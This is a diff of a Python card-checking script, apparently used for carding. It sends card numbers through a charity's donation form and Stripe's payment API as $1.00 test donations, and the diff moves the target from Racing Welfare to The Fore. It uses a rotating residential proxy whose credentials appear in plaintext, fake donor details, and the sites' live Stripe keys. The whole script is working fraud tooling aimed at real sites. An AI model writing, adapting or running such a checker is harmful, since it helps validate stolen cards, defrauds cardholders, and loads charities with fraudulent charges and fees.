@@ -2,7 +2,7 @@ import requests,re
 import random
 from proxy import reqproxy, make_request
 def Tele(ccx):
-	proxy_str = "p.webshare.io:80:rotate-zlanvdvs:7zzew86qyip3"
+	proxy_str = "la.residential.rayobyte.com:8000:bright69cc_gmail_com:Yaegyi224"
 	session, ip = reqproxy(proxy_str)
 	#print(f"IP Address: {ip}")
 	ccx=ccx.strip()
@@ -18,28 +18,27 @@ def Tele(ccx):
 	random_amount2 = random.randint(1, 99)
 
 	headers = {
-	    'authority': 'racingwelfare.co.uk',
-	    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
-	    'cache-control': 'max-age=0',
-	    'referer': 'https://www.google.com/',
+	    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+	    'Accept-Language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
+	    'Cache-Control': 'max-age=0',
+	    'Connection': 'keep-alive',
+	    'Sec-Fetch-Dest': 'document',
+	    'Sec-Fetch-Mode': 'navigate',
+	    'Sec-Fetch-Site': 'none',
+	    'Sec-Fetch-User': '?1',
+	    'Upgrade-Insecure-Requests': '1',
+	    'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
 	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
 	    'sec-ch-ua-mobile': '?1',
 	    'sec-ch-ua-platform': '"Android"',
-	    'sec-fetch-dest': 'document',
-	    'sec-fetch-mode': 'navigate',
-	    'sec-fetch-site': 'cross-site',
-	    'sec-fetch-user': '?1',
-	    'upgrade-insecure-requests': '1',
-	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
 	}
 	
-	response = requests.get('https://racingwelfare.co.uk/campaigns/donate-to-racing-welfare/', headers=headers)
+	response = session.get('https://thefore.org/campaigns/donate/', headers=headers)
 	
 	form_id = re.search(r'name="charitable_form_id" value="(.*?)"', response.text).group(1)
 	donation_nonce = re.search(r'name="_charitable_donation_nonce" value="(.*?)"', response.text).group(1)
-	
-	import requests
+	campaign_id = re.search(r'name="campaign_id" value="(.*?)"', response.text).group(1)
+	donation_id = re.search(r'name="ID" value="(.*?)"', response.text).group(1)
 	
 	headers = {
 	    'authority': 'api.stripe.com',
@@ -57,37 +56,37 @@ def Tele(ccx):
 	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
 	}
 	
-	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&payment_user_agent=stripe.js%2F4e21d61aa2%3B+stripe-js-v3%2F4e21d61aa2%3B+card-element&key=pk_live_qAsilTNmWb2Py0BubDmQYKTN'
+	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&payment_user_agent=stripe.js%2F399197339e%3B+stripe-js-v3%2F399197339e%3B+card-element&key=pk_live_51GY9Z7BL0CS8rR8jHCclfYbWANbFqlfRgq7lgJ1hhwg4ehcM3eQqBIRWc7kkloxswKZ8VBSdoRthk0RshUlmJqsk00bWSSgZE6'
 	
-	response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
+	response = session.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
 	
 	pm = response.json()['id']
 	
 	headers = {
-	    'authority': 'racingwelfare.co.uk',
-	    'accept': 'application/json, text/javascript, */*; q=0.01',
-	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
-	    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
-	    'origin': 'https://racingwelfare.co.uk',
-	    'referer': 'https://racingwelfare.co.uk/campaigns/donate-to-racing-welfare/',
+	    'Accept': 'application/json, text/javascript, */*; q=0.01',
+	    'Accept-Language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
+	    'Connection': 'keep-alive',
+	    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
+	    'Origin': 'https://thefore.org',
+	    'Referer': 'https://thefore.org/campaigns/donate/',
+	    'Sec-Fetch-Dest': 'empty',
+	    'Sec-Fetch-Mode': 'cors',
+	    'Sec-Fetch-Site': 'same-origin',
+	    'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
+	    'X-Requested-With': 'XMLHttpRequest',
 	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
 	    'sec-ch-ua-mobile': '?1',
 	    'sec-ch-ua-platform': '"Android"',
-	    'sec-fetch-dest': 'empty',
-	    'sec-fetch-mode': 'cors',
-	    'sec-fetch-site': 'same-origin',
-	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
-	    'x-requested-with': 'XMLHttpRequest',
 	}
 	
 	data = {
 	    'charitable_form_id': f'{form_id}',
 	    f'{form_id}': '',
 	    '_charitable_donation_nonce': f'{donation_nonce}',
-	    '_wp_http_referer': '/campaigns/donate-to-racing-welfare/',
-	    'campaign_id': '292',
-	    'description': 'Donate to Racing Welfare',
-	    'ID': '0',
+	    '_wp_http_referer': '/campaigns/donate/',
+	    'campaign_id': f'{campaign_id}',
+	    'description': 'The Fore',
+	    'ID': f'{donation_id}',
 	    'gateway': 'stripe',
 	    'donation_amount': 'custom',
 	    'custom_donation_amount': '1.00',
@@ -96,20 +95,14 @@ def Tele(ccx):
 	    'last_name': 'Paypal',
 	    'email': 'genpaypal02@gmail.com',
 	    'address': 'Street 27',
-	    'address_2': '',
-	    'address_3': '',
-	    'city': 'New York',
-	    'state': 'New York',
 	    'postcode': '10080',
-	    'country': 'US',
-	    'phone': '',
-	    'reason_doanting': 'Gen Paypal',
+	    'where_did_you_hear_about_us': 'twitter',
 	    'stripe_payment_method': f'{pm}',
 	    'action': 'make_donation',
 	    'form_action': 'make_donation',
 	}
 	
-	response = requests.post('https://racingwelfare.co.uk/wp-admin/admin-ajax.php', headers=headers, data=data)
+	response = session.post('https://thefore.org/wp-admin/admin-ajax.php', headers=headers, data=data)
 	
 	try:
 		scrt = response.json().get('secret')
@@ -139,11 +132,11 @@ def Tele(ccx):
 	data = {
 	    'expected_payment_method_type': 'card',
 	    'use_stripe_sdk': 'true',
-	    'key': 'pk_live_qAsilTNmWb2Py0BubDmQYKTN',
+	    'key': 'pk_live_51GY9Z7BL0CS8rR8jHCclfYbWANbFqlfRgq7lgJ1hhwg4ehcM3eQqBIRWc7kkloxswKZ8VBSdoRthk0RshUlmJqsk00bWSSgZE6',
 	    'client_secret': f'{scrt}',
 	}
 	
-	response = requests.post(
+	response = session.post(
 	    f'https://api.stripe.com/v1/payment_intents/{pi}/confirm',
 	    headers=headers,
 	    data=data,
